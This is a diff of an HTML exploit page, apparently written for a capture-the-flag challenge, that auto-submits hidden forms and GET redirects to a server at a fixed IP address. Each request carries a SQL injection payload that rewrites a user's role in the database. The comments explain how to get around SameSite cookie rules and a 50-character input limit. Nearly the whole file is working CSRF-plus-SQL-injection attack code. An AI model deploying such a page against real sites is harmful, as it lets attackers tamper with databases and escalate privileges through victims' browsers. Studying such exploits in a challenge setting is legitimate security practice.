@@ -1,25 +1,48 @@
 <!doctype html>
 <meta charset="utf-8">
-<title>upgrade user</title>
-
-<form id="f1" action="http://91.107.176.228:4000/debug/create_log" method="POST">
-  <input name="log" value="';update users set role='user'where id=13;select'">
-</form>
-<form id="f2" action="http://91.107.176.228:4000/create_log" method="POST">
-  <input name="log" value="';update users set role='user'where id=13;select'">
-</form>
-
-<form id="f3" action="http://91.107.176.228:4000/debug/create_log" method="POST">
-  <input name="log" value="x';update users set role='user'where id=13;select'">
-</form>
-<form id="f4" action="http://91.107.176.228:4000/create_log" method="POST">
-  <input name="log" value="x';update users set role='user'where id=13;select'">
-</form>
-
+<title>ASIS role upgrade – kitchen sink</title>
+<body>
 <script>
-  // fire all four, spaced by a tick, to dodge any per-request weirdness
-  setTimeout(()=>document.getElementById('f1').submit(), 10);
-  setTimeout(()=>document.getElementById('f2').submit(), 60);
-  setTimeout(()=>document.getElementById('f3').submit(), 110);
-  setTimeout(()=>document.getElementById('f4').submit(), 160);
+// =========  CONFIG  =========
+const ID = 80; // ← replace with your id from /me (you said it's 13)
+const ORIGIN = "http://91.107.176.228:4000";
+// Two payloads that satisfy the 50-char max and avoid "/" and "-"
+const p1 = "';UPDATE users SET role='user'WHERE id=" + ID + ";SELECT'"; // 49 chars when ID is 2 digits
+const p2 = "x';update users set role='user'where id=" + ID + ";select'"; // 50 chars when ID is 2 digits
+
+// =========  POST attempts (cookies likely blocked by SameSite=Lax, but we try anyway) =========
+function postOnce(path, payload) {
+  const f = document.createElement('form');
+  f.method = 'POST';
+  f.action = ORIGIN + path;
+  f.style.display = 'none';
+  const inp = document.createElement('input');
+  inp.name = 'log';
+  inp.value = payload;
+  f.appendChild(inp);
+  document.body.appendChild(f);
+  try { f.submit(); } catch(e) {}
+}
+
+// Fire a burst of POSTs to both likely endpoints with both payload variants
+setTimeout(()=>postOnce('/debug/create_log', p1), 10);
+setTimeout(()=>postOnce('/debug/create_log', p2), 80);
+setTimeout(()=>postOnce('/create_log',      p1), 150);
+setTimeout(()=>postOnce('/create_log',      p2), 220);
+
+// =========  GET attempts (top-level navigation so cookies are sent under Lax) =========
+// We try GET on /debug/create_log first; if the instance accepts GET, this will flip your role.
+function go(url){ try { location.href = url; } catch(e) {} }
+
+// Choose which GET to try first by reordering these lines if you like.
+setTimeout(()=>go(ORIGIN + '/debug/create_log?log=' + encodeURIComponent(p1)), 500);
+// If the server rejects that, re-run this page via the checker but with this next line uncommented instead:
+// setTimeout(()=>go(ORIGIN + '/debug/create_log?log=' + encodeURIComponent(p2)), 500);
+// Or try the alt path some builds expose (uncomment one and re-run via checker):
+// setTimeout(()=>go(ORIGIN + '/create_log?log=' + encodeURIComponent(p1)), 500);
+// setTimeout(()=>go(ORIGIN + '/create_log?log=' + encodeURIComponent(p2)), 500);
 </script>
+
+<h1>Working…</h1>
+<p>If you see this for more than a second, the page is about to redirect to the challenge site.</p>
+</body>
